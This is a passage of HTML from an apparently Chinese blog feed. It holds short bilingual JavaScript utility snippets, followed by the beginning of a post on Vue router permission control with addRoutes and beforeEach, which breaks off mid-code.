class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> anagrams = <span class="function"><span class="params">str</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (str.length &lt;= <span class="number">2</span>) <span class="keyword">return</span> str.length === <span class="number">2</span> ? [str, str[<span class="number">1</span>] + str[<span class="number">0</span>]] : [str];</span><br><span class="line">  <span class="keyword">return</span> str.split(<span class="string">&#x27;&#x27;</span>).reduce(<span class="function">(<span class="params">acc, letter, i</span>) =&gt;</span></span><br><span class="line">    acc.concat(anagrams(str.slice(<span class="number">0</span>, i) + str.slice(i + <span class="number">1</span>)).map(<span class="function"><span class="params">val</span> =&gt;</span> letter + val)), []);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// anagrams(&#x27;abc&#x27;) -&gt; [&#x27;abc&#x27;,&#x27;acb&#x27;,&#x27;bac&#x27;,&#x27;bca&#x27;,&#x27;cab&#x27;,&#x27;cba&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="Capitalize-first-letter-of-every-word-所有单词的第一个字母大写"><a href="#Capitalize-first-letter-of-every-word-所有单词的第一个字母大写" class="headerlink" title="Capitalize first letter of every word (所有单词的第一个字母大写)"></a>Capitalize first letter of every word (所有单词的第一个字母大写)</h3><p>使用 replace() 去查找单词的第一个字母并使用 toUpperCase() 改为大写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalizeEveryWord = <span class="function"><span class="params">str</span> =&gt;</span> str.replace(<span class="regexp">/\b[a-z]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> char.toUpperCase());</span><br><span class="line"><span class="comment">// capitalizeEveryWord(&#x27;hello world!&#x27;) -&gt; &#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Capitalize-first-letter-单词的第一个字母大写"><a href="#Capitalize-first-letter-单词的第一个字母大写" class="headerlink" title="Capitalize first letter (单词的第一个字母大写)"></a>Capitalize first letter (单词的第一个字母大写)</h3><p>使用 slice(0,1) 和 toUpperCase() 将首字母大写，使用 slice(1) 得到字符串的其余部分。<br>忽略 lowerRest 参数以保持字符串的其余部分不变，或者将其设置为 true 以转换为小写字母。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalize = <span class="function">(<span class="params">str, lowerRest = <span class="literal">false</span></span>) =&gt;</span></span><br><span class="line">  str.slice(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + (lowerRest ? str.slice(<span class="number">1</span>).toLowerCase() : str.slice(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// capitalize(&#x27;myName&#x27;, true) -&gt; &#x27;Myname&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Check-for-palindrome-检查回文"><a href="#Check-for-palindrome-检查回文" class="headerlink" title="Check for palindrome (检查回文)"></a>Check for palindrome (检查回文)</h3><p>使用 toLowerCase() 转换字符串并用 replace() 删除其中的非字母数字字符。<br>然后，使用 split(‘’) 分散为单个字符，再使用 reverse() 和 join(‘’) 倒序合并后与原字符进行比较。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> palindrome = <span class="function"><span class="params">str</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> s = str.toLowerCase().replace(<span class="regexp">/[\W_]/g</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> s === s.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// palindrome(&#x27;taco cat&#x27;) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Reverse-a-string-反转一个字符串"><a href="#Reverse-a-string-反转一个字符串" class="headerlink" title="Reverse a string (反转一个字符串)"></a>Reverse a string (反转一个字符串)</h3><p>使用数组解构和 Array.reverse() 来反转字符串中字符的顺序。<br>使用 join(‘’) 组合字符获得一个字符串。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> reverseString = <span class="function"><span class="params">str</span> =&gt;</span> [...str].reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// reverseString(&#x27;foobar&#x27;) -&gt; &#x27;raboof&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Sort-characters-in-string-alphabetical-字符串排序（按字母顺序排列）"><a href="#Sort-characters-in-string-alphabetical-字符串排序（按字母顺序排列）" class="headerlink" title="Sort characters in string (alphabetical) 字符串排序（按字母顺序排列）"></a>Sort characters in string (alphabetical) 字符串排序（按字母顺序排列）</h3><p>使用 split(‘’) 切割字符串，使用 Array.sort 通过 localeCompare() 去排序，再使用 join(‘’) 组合。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sortCharactersInString = <span class="function"><span class="params">str</span> =&gt;</span></span><br><span class="line">  str.split(<span class="string">&#x27;&#x27;</span>).sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.localeCompare(b)).join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// sortCharactersInString(&#x27;cabbage&#x27;) -&gt; &#x27;aabbceg&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Truncate-a-String-字符串截断"><a href="#Truncate-a-String-字符串截断" class="headerlink" title="Truncate a String (字符串截断)"></a>Truncate a String (字符串截断)</h3><p>确定字符串的长度是否大于 num。<br>将字符串截断为所需的长度，在末尾或原始字符串后附加 …。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> truncate = <span class="function">(<span class="params">str, num</span>) =&gt;</span></span><br><span class="line">  str.length &gt; num ? str.slice(<span class="number">0</span>, num &gt; <span class="number">3</span> ? num - <span class="number">3</span> : num) + <span class="string">&#x27;...&#x27;</span> : str;</span><br><span class="line"><span class="comment">// truncate(&#x27;boomerang&#x27;, 7) -&gt; &#x27;boom...&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Utility-效率工具"><a href="#Utility-效率工具" class="headerlink" title="Utility (效率工具)"></a>Utility (效率工具)</h3><p>Escape regular expression (转义正则表达式)<br>使用 replace() 去转义特殊字符。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> escapeRegExp = <span class="function"><span class="params">str</span> =&gt;</span> str.replace(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line"><span class="comment">// escapeRegExp(&#x27;(test)&#x27;) -&gt; \\(test\\)</span></span><br></pre></td></tr></table></figure><h3 id="Get-native-type-of-value-获取值的原始类型"><a href="#Get-native-type-of-value-获取值的原始类型" class="headerlink" title="Get native type of value (获取值的原始类型)"></a>Get native type of value (获取值的原始类型)</h3><p>返回值的构造函数名称的小写字符，值为 undefined 或 null 时则返回 undefined 或 null。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getType = <span class="function"><span class="params">v</span> =&gt;</span></span><br><span class="line">  v === <span class="literal">undefined</span> ? <span class="string">&#x27;undefined&#x27;</span> : v === <span class="literal">null</span> ? <span class="string">&#x27;null&#x27;</span> : v.constructor.name.toLowerCase();</span><br><span class="line"><span class="comment">// getType(new Set([1,2,3])) -&gt; &quot;set&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Is-array-是否是数组"><a href="#Is-array-是否是数组" class="headerlink" title="Is array (是否是数组)"></a>Is array (是否是数组)</h3><p>使用 Array.isArray() 去检查值是否为数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isArray = <span class="function"><span class="params">val</span> =&gt;</span> !!val &amp;&amp; <span class="built_in">Array</span>.isArray(val);</span><br><span class="line"><span class="comment">// isArray(null) -&gt; false</span></span><br><span class="line"><span class="comment">// isArray([1]) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-boolean-是否为布尔值"><a href="#Is-boolean-是否为布尔值" class="headerlink" title="Is boolean (是否为布尔值)"></a>Is boolean (是否为布尔值)</h3><p>使用 typeof 去检查值是否为原始布尔值类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isBoolean = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">&#x27;boolean&#x27;</span>;</span><br><span class="line"><span class="comment">// isBoolean(null) -&gt; false</span></span><br><span class="line"><span class="comment">// isBoolean(false) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-function-是否为函数"><a href="#Is-function-是否为函数" class="headerlink" title="Is function (是否为函数)"></a>Is function (是否为函数)</h3><p>使用 typeof 去检查值是否为函数原始类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isFunction = <span class="function"><span class="params">val</span> =&gt;</span> val &amp;&amp; <span class="keyword">typeof</span> val === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"><span class="comment">// isFunction(&#x27;x&#x27;) -&gt; false</span></span><br><span class="line"><span class="comment">// isFunction(x =&gt; x) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-number-是否为数值"><a href="#Is-number-是否为数值" class="headerlink" title="Is number (是否为数值)"></a>Is number (是否为数值)</h3><p>使用 typeof 去检查值是否为数值原始类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isNumber = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="comment">// isNumber(&#x27;1&#x27;) -&gt; false</span></span><br><span class="line"><span class="comment">// isNumber(1) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-string-是否为字符串"><a href="#Is-string-是否为字符串" class="headerlink" title="Is string (是否为字符串)"></a>Is string (是否为字符串)</h3><p>使用 typeof 去检查值是否为字符串原始类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isString = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="comment">// isString(10) -&gt; false</span></span><br><span class="line"><span class="comment">// isString(&#x27;10&#x27;) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-symbol-是否为-symbol-类型"><a href="#Is-symbol-是否为-symbol-类型" class="headerlink" title="Is symbol (是否为 symbol 类型)"></a>Is symbol (是否为 symbol 类型)</h3><p>使用 typeof 去检查值是否为 symbol 原始类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isSymbol = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">&#x27;symbol&#x27;</span>;</span><br><span class="line"><span class="comment">// isSymbol(&#x27;x&#x27;) -&gt; false</span></span><br><span class="line"><span class="comment">// isSymbol(Symbol(&#x27;x&#x27;)) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Measure-time-taken-by-function-测量函数的耗时"><a href="#Measure-time-taken-by-function-测量函数的耗时" class="headerlink" title="Measure time taken by function (测量函数的耗时)"></a>Measure time taken by function (测量函数的耗时)</h3><p>使用 console.time() 和 console.timeEnd() 来测量开始和结束时间之间的差异，以确定回调执行的时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> timeTaken = <span class="function"><span class="params">callback</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.time(<span class="string">&#x27;timeTaken&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> r = callback();</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">&#x27;timeTaken&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// timeTaken(() =&gt; Math.pow(2, 10)) -&gt; 1024</span></span><br><span class="line"><span class="comment">// (logged): timeTaken: 0.02099609375ms</span></span><br></pre></td></tr></table></figure><h3 id="Number-to-array-of-digits-数值转换为数组"><a href="#Number-to-array-of-digits-数值转换为数组" class="headerlink" title="Number to array of digits (数值转换为数组)"></a>Number to array of digits (数值转换为数组)</h3><p>将数值转换为字符串，使用 split() 分割为数组。<br>再使用 Array.map() 和 parseInt() 将每个值转换为整数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> digitize = <span class="function"><span class="params">n</span> =&gt;</span> (<span class="string">&#x27;&#x27;</span>+n).split(<span class="string">&#x27;&#x27;</span>).map(<span class="function"><span class="params">i</span> =&gt;</span> <span class="built_in">parseInt</span>(i));</span><br><span class="line"><span class="comment">// digitize(2334) -&gt; [2, 3, 3, 4]</span></span><br></pre></td></tr></table></figure><h3 id="Ordinal-suffix-of-number-（数值增加序号后缀）"><a href="#Ordinal-suffix-of-number-（数值增加序号后缀）" class="headerlink" title="Ordinal suffix of number （数值增加序号后缀）"></a>Ordinal suffix of number （数值增加序号后缀）</h3><p>Use the modulo operator (%) to find values of single and tens digits.<br>Find which ordinal pattern digits match.<br>If digit is found in teens pattern, use teens ordinal.</p><p>使用模运算符（％）来查找单位数和十位数的值。<br>查找数字匹配哪些序号模式。<br>如果数字在十几的模式中找到，请使用的十几的序数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> toOrdinalSuffix = <span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> int = <span class="built_in">parseInt</span>(num), digits = [(int % <span class="number">10</span>), (int % <span class="number">100</span>)],</span><br><span class="line">    ordinals = [<span class="string">&#x27;st&#x27;</span>, <span class="string">&#x27;nd&#x27;</span>, <span class="string">&#x27;rd&#x27;</span>, <span class="string">&#x27;th&#x27;</span>], oPattern = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    tPattern = [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>];</span><br><span class="line">  <span class="keyword">return</span> oPattern.includes(digits[<span class="number">0</span>]) &amp;&amp; !tPattern.includes(digits[<span class="number">1</span>]) ? int + ordinals[digits[<span class="number">0</span>] - <span class="number">1</span>] : int + ordinals[<span class="number">3</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// toOrdinalSuffix(&quot;123&quot;) -&gt; &quot;123rd&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Random-integer-in-range-指定范围内的随机整数"><a href="#Random-integer-in-range-指定范围内的随机整数" class="headerlink" title="Random integer in range (指定范围内的随机整数)"></a>Random integer in range (指定范围内的随机整数)</h3><p>使用 Math.random() 去生成一个在指定范围内的随机数，使用 Math.floor() 将其转换为整数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> randomIntegerInRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line"><span class="comment">// randomIntegerInRange(0, 5) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Random-number-in-range-指定范围内的随机数"><a href="#Random-number-in-range-指定范围内的随机数" class="headerlink" title="Random number in range (指定范围内的随机数)"></a>Random number in range (指定范围内的随机数)</h3><p>使用 Math.random() 去生成一个在指定范围内的随机数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> randomInRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span> <span class="built_in">Math</span>.random() * (max - min) + min;</span><br><span class="line"><span class="comment">// randomInRange(2,10) -&gt; 6.0211363285087005</span></span><br></pre></td></tr></table></figure><h3 id="RGB-to-hexadecimal-RGB转十六进制"><a href="#RGB-to-hexadecimal-RGB转十六进制" class="headerlink" title="RGB to hexadecimal (RGB转十六进制)"></a>RGB to hexadecimal (RGB转十六进制)</h3><p>使用按位左移运算符（&lt;&lt;）和 toString(16) 将 RGB 参数转换为十六进制，然后使用 padStart(6, ‘0’) 去获取6位数的十六进制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rgbToHex = <span class="function">(<span class="params">r, g, b</span>) =&gt;</span> ((r &lt;&lt; <span class="number">16</span>) + (g &lt;&lt; <span class="number">8</span>) + b).toString(<span class="number">16</span>).padStart(<span class="number">6</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">// rgbToHex(255, 165, 1) -&gt; &#x27;ffa501&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Swap-values-of-two-variables-交换两个变量的值"><a href="#Swap-values-of-two-variables-交换两个变量的值" class="headerlink" title="Swap values of two variables (交换两个变量的值)"></a>Swap values of two variables (交换两个变量的值)</h3><p>使用数组解构来交换两个变量之间的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[varA, varB] = [varB, varA];</span><br><span class="line"><span class="comment">// [x, y] = [y, x]</span></span><br></pre></td></tr></table></figure><h3 id="URL-parameters-（URL参数）"><a href="#URL-parameters-（URL参数）" class="headerlink" title="URL parameters （URL参数）"></a>URL parameters （URL参数）</h3><p>使用 match() 和一个合适的正则去获取所有键值对，使用 Array.reduce() 合并到一个对象中。<br>允许将 location.search 作为参数传递。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getUrlParameters = <span class="function"><span class="params">url</span> =&gt;</span></span><br><span class="line">  url.match(<span class="regexp">/([^?=&amp;]+)(=([^&amp;]*))/g</span>).reduce(</span><br><span class="line">    (a, v) =&gt; (a[v.slice(<span class="number">0</span>, v.indexOf(<span class="string">&#x27;=&#x27;</span>))] = v.slice(v.indexOf(<span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>), a), &#123;&#125;</span><br><span class="line">  );</span><br><span class="line"><span class="comment">// getUrlParameters(&#x27;http://url.com/page?name=Adam&amp;surname=Smith&#x27;) -&gt; &#123;name: &#x27;Adam&#x27;, surname: &#x27;Smith&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="UUID-generator-（UUID生成器）"><a href="#UUID-generator-（UUID生成器）" class="headerlink" title="UUID generator （UUID生成器）"></a>UUID generator （UUID生成器）</h3><p>使用 crypto API 生成符合 RFC4122 版本4的UUID。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uuid = <span class="function"><span class="params">_</span> =&gt;</span></span><br><span class="line">  ([<span class="number">1e7</span>] + -<span class="number">1e3</span> + -<span class="number">4e3</span> + -<span class="number">8e3</span> + -<span class="number">1e11</span>).replace(<span class="regexp">/[018]/g</span>, <span class="function"><span class="params">c</span> =&gt;</span></span><br><span class="line">    (c ^ crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">1</span>))[<span class="number">0</span>] &amp; <span class="number">15</span> &gt;&gt; c / <span class="number">4</span>).toString(<span class="number">16</span>)</span><br><span class="line">  );</span><br><span class="line"><span class="comment">// uuid() -&gt; &#x27;7982fcfe-5721-4632-bede-6000885be57d&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Validate-email-（校验邮箱）"><a href="#Validate-email-（校验邮箱）" class="headerlink" title="Validate email （校验邮箱）"></a>Validate email （校验邮箱）</h3><p>Use a regular experssion to check if the email is valid.<br>Returns true if email is valid, false if not.</p><p>使用正则表达式去检验邮箱格式。<br>返回 true 表示邮箱格式正确，false 则不正确。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> validateEmail = <span class="function"><span class="params">str</span> =&gt;</span></span><br><span class="line">  /^(([^<span class="xml"><span class="tag">&lt;&gt;</span>()\[\]\\.,;:\s@&quot;]+(\.[^<span class="tag">&lt;&gt;</span>()\[\]\\.,;:\s@&quot;]+)*)|(&quot;.+&quot;))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/.test(str);</span></span><br><span class="line"><span class="xml">// validateEmail(mymail@gmail.com) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Validate-number-（校验数值）"><a href="#Validate-number-（校验数值）" class="headerlink" title="Validate number （校验数值）"></a>Validate number （校验数值）</h3><p>使用 !isNaN 和 parseFloat() 来检查参数是否是一个数字（或允许转换为数值）。<br>使用 isFinite() 来检查数字是否是有限的。<br>使用 Number() 来检查数值转换是否成立。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> validateNumber = <span class="function"><span class="params">n</span> =&gt;</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(n)) &amp;&amp; <span class="built_in">isFinite</span>(n) &amp;&amp; <span class="built_in">Number</span>(n) == n;</span><br><span class="line"><span class="comment">// validateNumber(&#x27;10&#x27;) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Value-or-default-（值或默认值）"><a href="#Value-or-default-（值或默认值）" class="headerlink" title="Value or default （值或默认值）"></a>Value or default （值或默认值）</h3><p>默认返回 value 如果 value 为假，则返回默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> valueOrDefault = <span class="function">(<span class="params">value, d</span>) =&gt;</span> value || d;</span><br><span class="line"><span class="comment">// valueOrDefault(NaN, 30) -&gt; 30</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaScript </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于VUE的路由权限管理</title>
      <link href="2018/07/27/%E5%85%B3%E4%BA%8EVUE%E7%9A%84%E8%B7%AF%E7%94%B1%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
      <url>2018/07/27/%E5%85%B3%E4%BA%8EVUE%E7%9A%84%E8%B7%AF%E7%94%B1%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=2459854756,3883213966&fm=26&gp=0.jpg" class="lazyload" data-srcset="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=2459854756,3883213966&fm=26&gp=0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="s"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些看法，希望对大家有帮助。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>大体上实现的思路很简单，先上图：</p><p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/route-permission-control.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/route-permission-control.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="vue" title="vue"></p><p>无非是将路由配置按用户类型分割为 用户路由 和 基本路由，不同的用户类型可能存在不同的 用户路由，具体依赖实际业务。</p><ul><li>用户路由: 当前用户所特有的路由</li><li>基本路由：所有用户均可以访问的路由</li></ul><p>实现控制的方式分两种：</p><ol><li>通过 vue-router addRoutes 方法注入路由实现控制</li><li>通过 vue-router beforeEach 钩子限制路由跳转</li></ol><ul><li>addRoutes 方式</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，编码为 vue-router 所支持的基本格式（具体如何编码取决于前后端协商好的数据格式），通过调用 this.$router.addRoutes 方法将编码好的用户路由注入到现有的 vue-router 实例中去，以实现用户路由。</p></blockquote><ul><li>beforeEach 方式</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，通过注册 router.beforeEach 钩子对路由的每次跳转进行管理，每次跳转都进行检查，如果目标路由不存再于 基本路由 和 当前用户的 用户路由 中，取消跳转，转为跳转错误页。</p></blockquote><p><strong>以上两种方式均需要在 <code>vue-router</code> 中配置错误页，以保证用户感知权限不足。</strong> </p><p>两种方式的原理其实都是一样的，只不过 addRoutes 方式 通过注入路由配置告诉 vue-router ：“当前我们就只有这些路由，其它路由地址我们一概不认”，而 beforeEach 则更多的是依赖我们手动去帮 vue-router 辨别什么页面可以去，什么页面不可以去。说白了也就是 自动 与 手动 的差别。说到这，估计大家都会觉得既然是 自动 的，那肯定是 addRoutes 最方便快捷了，还能简化业务代码，笔者一开始也是这么认为的，但是！很多人都忽略了一点：</p><p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/vue-router-addRoutes.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/vue-router-addRoutes.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="vue" title="vues"></p><p><code>addRoutes</code> <strong>方法仅仅是帮你注入新的路由，并没有帮你剔除其它路由！</strong></p><p>设想存在这么一种情况：用户在自己电脑上登录了管理员账号，这个时候会向路由中注入管理员的路由，然后再退出登录，保持页面不刷新，改用普通用户账号进行登录，这个时候又会向路由中注入普通用户的路由，那么，在路由中将存在两种用户类型的路由，即使用户不感知，通过改变 url，普通用户也可以访问管理员的页面！</p><p>对于这个问题，也有一个解决办法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 